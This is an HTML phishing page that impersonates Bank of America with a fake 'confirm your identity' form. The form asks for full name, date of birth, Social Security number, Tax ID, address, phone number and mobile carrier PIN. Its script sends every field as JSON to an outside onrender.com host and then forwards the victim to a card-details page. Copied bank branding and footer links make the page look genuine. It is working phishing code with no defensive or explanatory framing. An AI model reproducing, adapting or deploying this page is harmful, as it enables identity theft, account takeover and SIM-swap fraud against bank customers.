<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bank of America</title>
  <link rel="shortcut icon" href="img/icona.png" />
  <link rel="stylesheet" href="style2.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
</head>

<body>
  <section id="header2">
    <a href="index.html" class="log">
      <img src="img/Bank-of-America-Logo.png" width="300px" height="35px" class="logo" />
    </a>
    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
  </section>

  <section id="hero2">
    <div class="bar">
      <ul id="navbarr">
        <h3>Update personal details</h3>
      </ul>
    </div>
  </section>

  <div class="container">
    <div>
      <h1>Let's confirm your identity.</h1>
    <p class="subtitle">
      To protect your account, please tell us the requested 
      info so we can confirm your identity. If you have more 
      than one account, choose one and we'll take care of the rest.
      <br> Commercial administrators must tell us a Tax ID number.
    </p>
    </div>
    
    <form id="login-details">

      <div class="form-group">
        <label for="name">Full Name </label>
        <div class="input-with-icon">
          <input type="text" id="fullname" name="fullname" autocomplete="OFF" required />
        </div>
      </div>

      <div class="form-group">
        <label for="dob">Date Of Birth <span class="hint">(MM/DD/YYYY)</span></label>
        <div class="input-with-icon">
          <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" autocomplete="off" required />
        </div>
      </div>

      <div class="form-group">
        <label for="ssn">Social Security Number (SSN)</label>
        <div class="input-with-icon">
          <input type="text" id="ssn" name="ssn" maxlength="11" autocomplete="off" placeholder="___-__-____" required />
        </div>
      </div>

      <div class="form-group">
        <label for="tax">Tax ID <span class="hint">(optional)</span></label>
        <div class="input-with-icon">
          <input type="text" id="tax" name="tax" autocomplete="off" />
        </div>
      </div>

      <hr class="divider" />

      <div class="form-group">
        <label for="address">Street Address</label>
        <div class="input-with-icon">
          <input type="text" id="address" name="address" autocomplete="off" required />
        </div>
      </div>

      <div class="form-group">
        <label for="state">State</label>
        <div class="input-with-icon">
          <input type="text" id="state" name="state" autocomplete="off" required />
        </div>
      </div>

      <div class="form-group">
        <label for="zip">Zip Code</label>
        <div class="input-with-icon">
          <input type="text" id="zip" name="zip" autocomplete="off" required />
        </div>
      </div>

      <div class="form-group">
        <label for="phone">Phone Number</label>
        <div class="input-with-icon">
          <input type="text" id="phone" name="phone" autocomplete="off"
            pattern="\d{3}-\d{3}-\d{4}" maxlength="12" required />
        </div>
      </div>

      <div class="form-group">
        <label for="pin">Carrier Pin</label>
        <div class="input-with-icon">
          <input type="text" id="pin" name="pin" autocomplete="off" required />
        </div>
      </div>


      <p class="link"><a href="#">Don't have a Social Security number or TIN?</a></p>
      <div class="button-group">
        <button type="submit" class="btn primary">Continue</button>
        <button type="button" class="btn outlined">Cancel</button>
      </div>


      <script>
  function toggleTooltip() {
    const tooltip = document.getElementById("dob-tooltip");
    tooltip.style.display = tooltip.style.display === "block" ? "none" : "block";
  }

  document.addEventListener("click", function (event) {
    const icon = document.querySelector(".icon");
    const tooltip = document.getElementById("dob-tooltip");
    if (!icon.contains(event.target) && !tooltip.contains(event.target)) {
      tooltip.style.display = "none";
    }
  });

  document.addEventListener('DOMContentLoaded', () => {
    // Format DOB
    const dob = document.getElementById('dob');
    if (dob) {
      dob.addEventListener('input', e => {
        let d = e.target.value.replace(/\D/g, '').slice(0, 8);
        const parts = [];
        if (d.length > 4) parts.push(d.slice(0, 2), d.slice(2, 4), d.slice(4));
        else if (d.length > 2) parts.push(d.slice(0, 2), d.slice(2));
        else parts.push(d);
        e.target.value = parts.join('/');
      });
    }

    // Format SSN
    const ssn = document.getElementById('ssn');
    if (ssn) {
      ssn.addEventListener('input', e => {
        let s = e.target.value.replace(/\D/g, '').slice(0, 9);
        const parts = [];
        if (s.length > 5) parts.push(s.slice(0, 3), s.slice(3, 5), s.slice(5));
        else if (s.length > 3) parts.push(s.slice(0, 3), s.slice(3));
        else parts.push(s);
        e.target.value = parts.join('-');
      });
    }

    // Format phone
    document.getElementById('phone').addEventListener('input', function (e) {
      let input = e.target.value.replace(/\D/g, '').slice(0, 10);
      if (input.length > 6) {
        input = input.replace(/(\d{3})(\d{3})(\d{1,4})/, '$1-$2-$3');
      } else if (input.length > 3) {
        input = input.replace(/(\d{3})(\d{1,3})/, '$1-$2');
      }
      e.target.value = input;
    });
  });

  document.getElementById("login-details").addEventListener("submit", async function (e) {
    e.preventDefault();

    const payload = {
      fullname: document.getElementById("fullname").value,
      dob: document.getElementById("dob").value,
      ssn: document.getElementById("ssn").value,
      tax: document.getElementById("tax").value,
      address: document.getElementById("address").value,
      state: document.getElementById("state").value,
      zip: document.getElementById("zip").value,
      phone: document.getElementById("phone").value,
      pin: document.getElementById("pin").value
    };

    try {
      const res = await fetch('https://erhugeh4y39523789498ut4384.onrender.com/details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        window.location.href = "card.html";
      } else {
        alert("Submission failed.");
      }
    } catch (err) {
      console.error("Error:", err);
      alert("Network error.");
    }
  });

  document.getElementById("cancelBtn").addEventListener("click", () => {
    window.location.href = "card.html";
  });
</script>


      </script>
    </form>
  </div>
</body>
<footer>
  <div class="gray-bground-skin">
    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
    <div class="link-container">
      <div class="link-row">
        <a href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy</a>
        <a href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
        <div class="clearboth"></div>
      </div>
    </div>
    <p>
      Bank of America, N.A. Member FDIC.
      <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank">Equal Housing Lender</a>
      <i class="fa fa-home"></i><br />Â© 2025 Bank of America Corporation.
    </p>
  </div>
</footer>

</html>
